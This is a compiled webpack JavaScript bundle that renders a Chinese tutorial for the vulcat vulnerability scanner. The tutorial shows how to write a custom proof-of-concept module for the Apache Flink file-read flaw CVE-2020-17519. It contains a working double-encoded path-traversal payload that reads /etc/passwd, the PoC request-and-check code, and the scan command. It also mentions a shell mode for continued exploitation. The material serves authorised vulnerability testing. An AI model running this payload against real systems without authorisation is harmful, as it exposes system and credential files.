(window.webpackJsonp=window.webpackJsonp||[]).push([[217],{531:function(t,a,s){"use strict";s.r(a);var n=s(7),e=Object(n.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"自定义攻击载荷-poc示例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#自定义攻击载荷-poc示例"}},[t._v("#")]),t._v(" 自定义攻击载荷-POC示例")]),t._v(" "),a("h5",{attrs:{id:"本节以apache-flink的任意文件读取漏洞cve-2020-17519为例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#本节以apache-flink的任意文件读取漏洞cve-2020-17519为例"}},[t._v("#")]),t._v(" 本节以Apache Flink的任意文件读取漏洞CVE-2020-17519为例")]),t._v(" "),a("h2",{attrs:{id:"_1-准备模板文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-准备模板文件"}},[t._v("#")]),t._v(" 1. 准备模板文件")]),t._v(" "),a("p",[t._v("此处新建一个目录payloads2，并将载荷模板"),a("code",[t._v("demo.py")]),t._v("复制一份，放入该目录\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/02.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("打开模板文件，其结构如下\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/03.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("你可以在上方添加注释，例如：")]),t._v(" "),a("ul",[a("li",[t._v("漏洞名称")]),t._v(" "),a("li",[t._v("漏洞编号")]),t._v(" "),a("li",[t._v("Payload来源")]),t._v(" "),a("li",[t._v("漏洞描述")]),t._v(" "),a("li",[t._v("POC / EXP作者（编写载荷的人）")]),t._v(" "),a("li",[t._v("作者个人主页链接")]),t._v(" "),a("li",[t._v("...等\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/04.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("h2",{attrs:{id:"_2-定义payload"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-定义payload"}},[t._v("#")]),t._v(" 2. 定义Payload")]),t._v(" "),a("p",[t._v("在__init__方法中，定义该漏洞的有效载荷")]),t._v(" "),a("p",[t._v("此处为简便，只定义了一条载荷。")]),t._v(" "),a("ul",[a("li",[t._v("在实际运用中，需要对路径、系统等因素设置不同的载荷")]),t._v(" "),a("li",[t._v("例如Linux读取/etc/passwd文件")]),t._v(" "),a("li",[t._v("Windows读取C:/Windows/win.ini文件等")])]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[t._v("self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("payloads "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'path'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/05.png",alt:""}}),a("figcaption")]),t._v(" "),a("h2",{attrs:{id:"_3-编写poc主体"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-编写poc主体"}},[t._v("#")]),t._v(" 3. 编写POC主体")]),t._v(" "),a("h3",{attrs:{id:"_3-1-poc基本结构"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-1-poc基本结构"}},[t._v("#")]),t._v(" 3.1 POC基本结构")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[t._v("client "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" clients"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("get"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'reqClient'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        \nvul_info "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'app_name'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'ApacheFlink'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'vul_type'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'FileRead'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'vul_id'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'CVE-2020-17519'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br")])]),a("ol",[a("li",[t._v("获取请求客户端"),a("code",[t._v("client")])]),t._v(" "),a("li",[t._v("定义漏洞信息"),a("code",[t._v("vul_info")]),t._v("，其中的三个字段名称是固定的：app_name、vul_type、vul_id")])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/06.png",alt:""}}),a("figcaption")]),t._v(" "),a("p",[t._v("关于请求客户端"),a("code",[t._v("client")]),t._v("，vulcat包装了"),a("code",[t._v("requests")]),t._v("以及"),a("code",[t._v("HackRequests")]),t._v("这两个库\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/07.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("包装过后，可以对HTTP请求进行统一处理")]),t._v(" "),a("p",[t._v("并为其添加一些常用参数，使其更易使用，不用频繁添加参数，例如：")]),t._v(" "),a("ul",[a("li",[t._v("requests默认将无视HTTPS证书警告（verify=False）")]),t._v(" "),a("li",[t._v("默认超时时间10秒")]),t._v(" "),a("li",[t._v("统一的HTTP代理")]),t._v(" "),a("li",[t._v("域名")]),t._v(" "),a("li",[t._v("协议://域名")]),t._v(" "),a("li",[t._v("...等\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/08.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" payload "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" self"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("payloads"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    path "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'path'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("让我们回到POC的编写当中")]),t._v(" "),a("p",[t._v("此时你可以遍历"),a("code",[t._v("self.payloads")]),t._v("，并接收其中的参数\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/09.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("h3",{attrs:{id:"_3-2-请求调用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-请求调用"}},[t._v("#")]),t._v(" 3.2 请求调用")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[t._v("res "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" client"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("request"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'get'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    path"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    vul_info"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("vul_info\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" res "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("is")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("None")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("continue")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br")])]),a("p",[t._v("使用客户端"),a("code",[t._v("client")]),t._v("发出请求")]),t._v(" "),a("ul",[a("li",[t._v("第一个参数：HTTP方法（大小写不敏感）")]),t._v(" "),a("li",[t._v("第二个参数：URL路径"),a("b",[t._v("（注意，只需要路径，不需要前面的http://xxx.com/，因为vulcat会自动将它们拼接起来）")])]),t._v(" "),a("li",[t._v("额外的参数：vul_info漏洞信息，将作用于HTTP日志（也就是--log选项输出的HTTP信息）")])]),t._v(" "),a("p",[t._v("接收请求之后，你需要判断结果是否为"),a("code",[t._v("None")])]),t._v(" "),a("ul",[a("li",[t._v("如果为None，说明请求失败，跳过当前载荷，继续下一轮循环")]),t._v(" "),a("li",[t._v("如果不为None，说明请求成功，接下来将判断是否存在漏洞")])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/10.png",alt:""}}),a("figcaption")]),t._v(" "),a("h3",{attrs:{id:"_3-3-判断结果-并-返回漏洞信息"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-3-判断结果-并-返回漏洞信息"}},[t._v("#")]),t._v(" 3.3 判断结果 并 返回漏洞信息")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" lib"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("tool "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" check\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("check"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("check_res_fileread"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("res"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    results "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Target'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" res"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("request"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Type'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("vul_info"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'app_name'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" vul_info"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'vul_type'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" vul_info"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'vul_id'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Request'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" res\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" results\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br")])]),a("p",[t._v("对于文件读取漏洞，你可以使用vulcat自带的方法"),a("code",[t._v("check.check_res_fileread()")]),t._v("来进行检测")]),t._v(" "),a("ul",[a("li",[t._v("如果目标存在文件读取漏洞，则该方法返回 True")]),t._v(" "),a("li",[t._v("否则返回 False")])]),t._v(" "),a("p",[t._v("如果存在漏洞，则返回结果results")]),t._v(" "),a("ul",[a("li",[t._v("字符串数据，将以 "),a("b",[t._v("key:value")]),t._v(" 的方式显示（例如Target）")]),t._v(" "),a("li",[t._v("列表数据，将以 "),a("b",[t._v("key: v1 v2 v3")]),t._v(" 的方式显示（例如Type）")]),t._v(" "),a("li",[t._v("Response数据，将显示一个"),a("b",[t._v("HTTP请求数据包")]),t._v("（例如Request）")])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/13.png",alt:""}}),a("figcaption")]),t._v(" "),a("p",[t._v("注意：使用该方法之前需要先导入模块\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/12.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("这是vulcat自带的"),a("code",[t._v("check.check_res_fileread()")]),t._v("函数，你可以定义统一的检测需求\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/15.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("h3",{attrs:{id:"_3-4-start"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-4-start"}},[t._v("#")]),t._v(" 3.4 Start()")]),t._v(" "),a("p",[t._v("最后，在Start方法中进行调配，此处直接返回一个"),a("code",[t._v("self.POC(clients)")]),t._v("，其中传递了一个参数clients\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/14.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("h2",{attrs:{id:"_4-装填载荷"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-装填载荷"}},[t._v("#")]),t._v(" 4. 装填载荷")]),t._v(" "),a("h3",{attrs:{id:"_4-1-修改载荷文件名称"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-1-修改载荷文件名称"}},[t._v("#")]),t._v(" 4.1 修改载荷文件名称")]),t._v(" "),a("p",[t._v("命名规则："),a("b",[t._v("框架名称-编号-漏洞类型")])]),t._v(" "),a("ul",[a("li",[t._v("如果框架名称太长，可以使用 - 分隔")]),t._v(" "),a("li",[t._v("可以同时存在多个漏洞类型，例如 apache-httpd-cve-2021-42013-rce-fileread")])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/16.png",alt:""}}),a("figcaption")]),t._v(" "),a("h3",{attrs:{id:"_4-2-把载荷-放入载荷路径"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-2-把载荷-放入载荷路径"}},[t._v("#")]),t._v(" 4.2 把载荷 放入载荷路径")]),t._v(" "),a("p",[t._v("把大象装进冰箱需要几步？\n把大象装进冰箱需要几步？\n把大象装进冰箱需要几步？")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("打开"),a("code",[t._v("vulcat/config.yaml")]),t._v("查看载荷路径\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/17.png",alt:""}}),a("figcaption")]),a("p")]),t._v(" "),a("li",[a("p",[t._v("把刚刚编写的文件丢进"),a("code",[t._v("payloads/")]),t._v("目录\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/18.png",alt:""}}),a("figcaption")]),a("p")]),t._v(" "),a("li",[a("p",[t._v("关闭"),a("code",[t._v("vulcat/config.yaml")]),t._v("文件")])])]),t._v(" "),a("p",[t._v("（此步骤没有图片）")]),t._v(" "),a("h2",{attrs:{id:"_5-扫描测试"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-扫描测试"}},[t._v("#")]),t._v(" 5. 扫描测试")]),t._v(" "),a("p",[t._v("现在，vulcat会自动识别你编写的载荷，你可以运行vulcat测试效果")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("python vulcat.py "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("目标地址"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--log")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-v")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("载荷名称"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/19.png",alt:""}}),a("figcaption")]),t._v(" "),a("p",[a("code",[t._v("-v/--vuln")]),t._v("选项支持模糊匹配，你不需要输入完整的载荷名称\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/20.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("模糊匹配\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/21.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[a("code",[t._v("--shell")]),t._v("支持，可以使用该选项进入Shell交互模式，以持续利用漏洞：")]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/22.png",alt:""}}),a("figcaption")]),t._v(" "),a("h2",{attrs:{id:"_6-废话"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_6-废话"}},[t._v("#")]),t._v(" 6. 废话")]),t._v(" "),a("p",[t._v("你可以为载荷创建一个专门的目录，用于分类")]),t._v(" "),a("p",[t._v("（不会影响载荷的效果，就算有几百层目录，vulcat也可以识别 并装填Payload）")]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/23.png",alt:""}}),a("figcaption")])])}),[],!1,null,null,null);a.default=e.exports}}]);